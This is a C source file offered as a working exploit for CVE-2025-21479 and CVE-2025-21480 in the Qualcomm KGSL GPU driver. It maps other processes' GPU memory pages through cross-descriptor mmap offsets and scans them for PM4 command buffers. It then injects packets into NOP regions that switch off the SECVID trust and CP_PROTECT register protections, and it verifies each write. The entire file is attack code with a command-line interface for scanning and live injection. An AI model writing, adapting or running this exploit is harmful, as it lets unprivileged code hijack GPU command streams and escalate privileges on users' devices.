/*
 * parasitic_inject_v3.c - correct implementation of CVE-2025-21479 parasitic injection
 *
 * Key findings:
 * 1. Use IOCTL_GPUMEM_ALLOC (0xc018092f), not GPUOBJ_ALLOC
 * 2. mmap uses gpuaddr as the offset
 * 3. Cross-FD access: offset = (page_index + 1) * 0x1000
 * 4. page_index = (gpuaddr - 0x4000000000) / 0x1000
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

/* PM4 Definitions */
#define PM4_TYPE3 0xC0000000
#define PM4_TYPE4 0x40000000

#define CP_NOP 0x10
#define CP_IB 0x3F
#define CP_MEM_WRITE 0x3D
#define CP_REG_WRITE 0x3C
#define CP_WAIT_IDLE 0x26
#define CP_DRAW_INDX 0x22

#define RBBM_SECVID_TRUST_CNTL 0x0F400
#define CP_PROTECT_CNTL 0x0084C

#define PKT3(op, cnt) (PM4_TYPE3 | (((cnt) - 1) << 16) | ((op) << 8))
#define PKT4(reg, cnt) (PM4_TYPE4 | ((cnt) & 0x7F) | (((reg) & 0x3FFFF) << 8))

static sigjmp_buf jmp_env;
static volatile int sig_received = 0;

static void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

static int safe_read(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

static int safe_write(void *ptr, uint64_t val)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *(volatile uint64_t *)ptr = val;
        return 0;
    }
    return -1;
}

static volatile int running = 1;

static void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
}

/* Allocate GPU memory */
static int alloc_gpu_mem(int fd, uint64_t *gpuaddr)
{
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};

    req.size = 0x1000;

    if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &req) < 0)
    {
        return -1;
    }

    *gpuaddr = req.gpuaddr;
    return 0;
}

/* Access a GPU memory page through the offset */
static void *map_gpu_page(int fd, uint64_t offset)
{
    void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd, offset);
    return addr;
}

/* Check the PM4 content */
static int analyze_pm4(const uint32_t *buf, size_t dwords,
                       int *pm4_out, int *ib_out, int *nop_out, int *draw_out)
{
    int pm4 = 0, ib = 0, nop = 0, draw = 0;

    for (size_t i = 0; i < dwords;)
    {
        uint32_t h = buf[i];
        if (h == 0)
        {
            i++;
            continue;
        }

        if ((h & 0xC0000000) == 0xC0000000)
        {
            int opcode = (h >> 8) & 0xFF;
            int count = ((h >> 16) & 0x3FFF) + 1;
            pm4++;

            switch (opcode)
            {
            case CP_NOP:
                nop++;
                break;
            case CP_IB:
                ib++;
                break;
            case CP_DRAW_INDX:
                draw++;
                break;
            }

            i += 1 + count;
        }
        else if ((h & 0xF0000000) == 0x70000000)
        {
            pm4++;
            i += 1 + (h & 0xFFFF);
        }
        else if ((h & 0xF0000000) == 0x40000000)
        {
            pm4++;
            i += 1 + (h & 0x7F) + 1;
        }
        else
        {
            i++;
        }
    }

    if (pm4_out)
        *pm4_out = pm4;
    if (ib_out)
        *ib_out = ib;
    if (nop_out)
        *nop_out = nop;
    if (draw_out)
        *draw_out = draw;

    return pm4 > 5;
}

/* Find the NOP sequence */
static int find_nop_sequence(const uint32_t *buf, size_t dwords, int min_space)
{
    for (size_t i = 0; i < dwords;)
    {
        uint32_t h = buf[i];

        if ((h & 0xC0000000) == 0xC0000000)
        {
            int opcode = (h >> 8) & 0xFF;
            int count = ((h >> 16) & 0x3FFF) + 1;

            if (opcode == CP_NOP && count >= min_space)
            {
                return (int)i;
            }

            i += 1 + count;
        }
        else if (h == 0)
        {
            /* Zero padding */
            int zeros = 0;
            size_t j = i;
            while (j < dwords && buf[j] == 0)
            {
                zeros++;
                j++;
            }
            if (zeros >= min_space)
            {
                return (int)i;
            }
            i = j;
        }
        else
        {
            i++;
        }
    }

    return -1;
}

/* Build the injection payload */
static int build_payload(uint32_t *buf, int type)
{
    int idx = 0;

    switch (type)
    {
    case 0: /* SECVID disable */
        buf[idx++] = PKT3(CP_WAIT_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_REG_WRITE, 2);
        buf[idx++] = RBBM_SECVID_TRUST_CNTL;
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0001;
        break;

    case 1: /* CP_PROTECT disable */
        buf[idx++] = PKT3(CP_WAIT_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT4(CP_PROTECT_CNTL, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0002;
        break;

    case 2: /* Combined */
        buf[idx++] = PKT3(CP_WAIT_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_REG_WRITE, 2);
        buf[idx++] = RBBM_SECVID_TRUST_CNTL;
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT4(CP_PROTECT_CNTL, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0003;
        break;
    }

    return idx;
}

/* Scan every possible offset */
static void scan_offsets(int fd, uint64_t start_idx, uint64_t end_idx)
{
    printf("\n[*] Scanning page indices %lu - %lu\n",
           (unsigned long)start_idx, (unsigned long)end_idx);

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);
    signal(SIGINT, sigint_handler);

    int mapped = 0, readable = 0, pm4_found = 0;

    for (uint64_t page_idx = start_idx; page_idx < end_idx && running; page_idx++)
    {
        uint64_t offset = (page_idx + 1) * 0x1000;

        void *addr = map_gpu_page(fd, offset);
        if (addr != MAP_FAILED)
        {
            mapped++;

            uint64_t val;
            if (safe_read(addr, &val) == 0)
            {
                readable++;

                if (val != 0)
                {
                    /* Has data, check for PM4 */
                    const uint32_t *buf = (const uint32_t *)addr;
                    int pm4, ib, nop, draw;

                    if (analyze_pm4(buf, 256, &pm4, &ib, &nop, &draw))
                    {
                        pm4_found++;

                        uint64_t gpuaddr = 0x4000000000ULL + page_idx * 0x1000;
                        printf("\n[+] PM4 BUFFER @ page_idx=%lu (gpuaddr=0x%lx)\n",
                               (unsigned long)page_idx, (unsigned long)gpuaddr);
                        printf("    PM4=%d, IB=%d, NOP=%d, DRAW=%d\n", pm4, ib, nop, draw);

                        if (nop > 0)
                        {
                            printf("    [!!!] HAS NOP - INJECTABLE!\n");
                        }
                    }
                }
            }

            munmap(addr, 0x1000);
        }

        if ((page_idx - start_idx) % 10000 == 0 && page_idx > start_idx)
        {
            printf("\r[*] Progress: %lu/%lu, mapped=%d, readable=%d, PM4=%d    ",
                   (unsigned long)(page_idx - start_idx),
                   (unsigned long)(end_idx - start_idx),
                   mapped, readable, pm4_found);
            fflush(stdout);
        }
    }

    printf("\n\n[*] Scan complete: mapped=%d, readable=%d, PM4=%d\n",
           mapped, readable, pm4_found);
}

/* Continuously monitor and inject */
static void monitor_and_inject(int fd, int duration, int payload_type)
{
    printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  REAL-TIME MONITOR & INJECT                                   ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    /* Build payload */
    uint32_t payload[32];
    int payload_size = build_payload(payload, payload_type);
    printf("[*] Payload type: %d, size: %d dwords\n", payload_type, payload_size);

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);
    signal(SIGINT, sigint_handler);

    time_t start = time(NULL);
    int scans = 0, injects = 0, success = 0;

    printf("[*] Monitoring for %d seconds (Ctrl+C to stop)...\n\n", duration);

    while (running && (time(NULL) - start) < duration)
    {
        /* Scan first 65536 pages (256MB of GPU address space) */
        for (uint64_t page_idx = 0; page_idx < 65536 && running; page_idx++)
        {
            uint64_t offset = (page_idx + 1) * 0x1000;

            void *addr = map_gpu_page(fd, offset);
            if (addr == MAP_FAILED)
                continue;

            uint64_t val;
            if (safe_read(addr, &val) != 0 || val == 0)
            {
                munmap(addr, 0x1000);
                continue;
            }

            const uint32_t *buf = (const uint32_t *)addr;
            int pm4, ib, nop, draw;

            if (analyze_pm4(buf, 256, &pm4, &ib, &nop, &draw) && nop > 0)
            {
                /* Found injectable buffer */
                int inject_idx = find_nop_sequence(buf, 256, payload_size);

                if (inject_idx >= 0)
                {
                    printf("\n[!] INJECTION @ page_idx=%lu +0x%x\n",
                           (unsigned long)page_idx, inject_idx * 4);

                    /* Inject */
                    uint32_t *wbuf = (uint32_t *)addr;
                    for (int i = 0; i < payload_size; i++)
                    {
                        if (safe_write(&wbuf[inject_idx + i], payload[i]) != 0)
                        {
                            printf("    [-] Write failed at offset %d\n", i);
                            break;
                        }
                    }
                    __sync_synchronize();

                    injects++;

                    /* Verify */
                    int verified = 1;
                    for (int i = 0; i < payload_size; i++)
                    {
                        uint64_t v;
                        if (safe_read(&wbuf[inject_idx + i], &v) != 0 ||
                            (uint32_t)v != payload[i])
                        {
                            verified = 0;
                            break;
                        }
                    }

                    if (verified)
                    {
                        success++;
                        printf("    [+] INJECTION VERIFIED!\n");
                    }
                }
            }

            munmap(addr, 0x1000);
            scans++;
        }

        printf("\r[*] Scans: %d, Injects: %d/%d    ", scans, success, injects);
        fflush(stdout);

        usleep(10000);
    }

    printf("\n\n[*] Monitor complete.\n");
    printf("[*] Total scans: %d\n", scans);
    printf("[*] Injections: %d successful / %d attempted\n", success, injects);
}

/* First allocate several buffers to test the offset mechanism */
static void test_offset_mechanism(int fd)
{
    printf("\n=== Testing Offset Mechanism ===\n");

#define NUM_ALLOCS 10
    uint64_t gpuaddrs[NUM_ALLOCS];

    /* Allocate several buffers */
    printf("[*] Allocating %d GPU buffers...\n", NUM_ALLOCS);
    for (int i = 0; i < NUM_ALLOCS; i++)
    {
        if (alloc_gpu_mem(fd, &gpuaddrs[i]) < 0)
        {
            printf("[-] Alloc %d failed: %s\n", i, strerror(errno));
            return;
        }
        printf("  [%d] gpuaddr=0x%lx\n", i, (unsigned long)gpuaddrs[i]);
    }

    /* Write markers */
    for (int i = 0; i < NUM_ALLOCS; i++)
    {
        void *addr = map_gpu_page(fd, gpuaddrs[i]);
        if (addr != MAP_FAILED)
        {
            *(volatile uint64_t *)addr = 0xAA00000000000000ULL | i;
            munmap(addr, 0x1000);
        }
    }

    printf("\n[*] Testing offset access (using second fd):\n");

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        printf("[-] Cannot open second fd\n");
        return;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    for (int i = 0; i < NUM_ALLOCS; i++)
    {
        uint64_t page_idx = (gpuaddrs[i] - 0x4000000000ULL) / 0x1000;
        uint64_t offset = (page_idx + 1) * 0x1000;

        void *addr = map_gpu_page(fd2, offset);
        if (addr != MAP_FAILED)
        {
            uint64_t val;
            if (safe_read(addr, &val) == 0)
            {
                uint64_t expected = 0xAA00000000000000ULL | i;
                printf("  offset=0x%lx -> val=0x%lx %s\n",
                       (unsigned long)offset, (unsigned long)val,
                       val == expected ? "[MATCH]" : "[MISMATCH]");
            }
            else
            {
                printf("  offset=0x%lx -> READ FAULT\n", (unsigned long)offset);
            }
            munmap(addr, 0x1000);
        }
        else
        {
            printf("  offset=0x%lx -> MMAP FAILED: %s\n",
                   (unsigned long)offset, strerror(errno));
        }
    }

    /* Test a wider offset range */
    printf("\n[*] Testing extended offset range:\n");
    for (uint64_t off = 0x1000; off <= 0x100000; off *= 2)
    {
        void *addr = map_gpu_page(fd2, off);
        if (addr != MAP_FAILED)
        {
            uint64_t val;
            if (safe_read(addr, &val) == 0)
            {
                printf("  offset=0x%lx -> val=0x%lx\n",
                       (unsigned long)off, (unsigned long)val);
            }
            else
            {
                printf("  offset=0x%lx -> READABLE but FAULT\n", (unsigned long)off);
            }
            munmap(addr, 0x1000);
        }
    }

    close(fd2);
}

int main(int argc, char *argv[])
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 + CVE-2025-21480 Parasitic Inject v3                  ║\n");
    printf("║  Using correct IOCTL and offset mechanism                             ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");

    if (argc < 2)
    {
        printf("Usage: %s <command> [options]\n\n", argv[0]);
        printf("Commands:\n");
        printf("  test              - Test offset mechanism\n");
        printf("  scan <start> <end>- Scan page index range\n");
        printf("  monitor <secs> <type> - Real-time monitor & inject\n");
        return 1;
    }

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] KGSL fd: %d\n", fd);

    /* First allocate a buffer */
    uint64_t our_gpuaddr;
    if (alloc_gpu_mem(fd, &our_gpuaddr) < 0)
    {
        printf("[-] Cannot alloc GPU mem\n");
        close(fd);
        return 1;
    }
    printf("[+] Our GPU alloc: gpuaddr=0x%lx\n", (unsigned long)our_gpuaddr);

    if (strcmp(argv[1], "test") == 0)
    {
        test_offset_mechanism(fd);
    }
    else if (strcmp(argv[1], "scan") == 0)
    {
        uint64_t start = (argc > 2) ? strtoull(argv[2], NULL, 0) : 0;
        uint64_t end = (argc > 3) ? strtoull(argv[3], NULL, 0) : 65536;
        scan_offsets(fd, start, end);
    }
    else if (strcmp(argv[1], "monitor") == 0)
    {
        int duration = (argc > 2) ? atoi(argv[2]) : 30;
        int ptype = (argc > 3) ? atoi(argv[3]) : 0;
        monitor_and_inject(fd, duration, ptype);
    }
    else
    {
        printf("[-] Unknown command\n");
    }

    close(fd);
    return 0;
}
